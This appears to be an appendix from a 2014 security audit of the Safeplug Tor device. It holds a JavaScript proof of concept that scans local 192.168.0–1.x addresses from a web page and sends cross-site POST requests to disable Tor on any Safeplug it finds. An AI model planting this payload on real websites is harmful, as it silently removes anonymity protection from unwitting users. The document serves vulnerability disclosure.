Security Audit of Safeplug

### 2014-01-24 report/report.tex
small edits

>>>>

\newpage
\appendix
\section{\\Javascript for Website Attack} \label{App:AppendixA}
\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}

\lstset{frame=tb,
  language=Java,
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true
  tabsize=3
}

\begin{lstlisting}
function go() { 
   var IP_SCANS = 255;
   var prefix = "http://192."
   var SECOND_START = 168;
   var SECOND_END = 168;
   var THIRD_START = 0;
   var THIRD_END = 1;
   var mydate = new Date();
   console.log(mydate.getTime());

   for (var i = SECOND_START; i <= SECOND_END; i++) {
      for (var j = THIRD_START; j <= THIRD_END; j++) {
         for (var k = 0; k < IP_SCANS; k++) 
         {
            var tryip = prefix +  i + "." + j + "." + k;
            var req = new XMLHttpRequest();
            req.open("POST", tryip + "/svc/xspctrl/disableTor", true);
            req.timeout = 1000;
            req.send();
         }
         // COMMENT THIS OUT BEFORE RUNNING LARGE SCANS!
         var mydate2 = new Date();
         console.log(mydate2.getTime() + " " + j);
      }
      var mydate = new Date();
      console.log(mydate.getTime() + " " + i);
   }
}
\end{lstlisting}
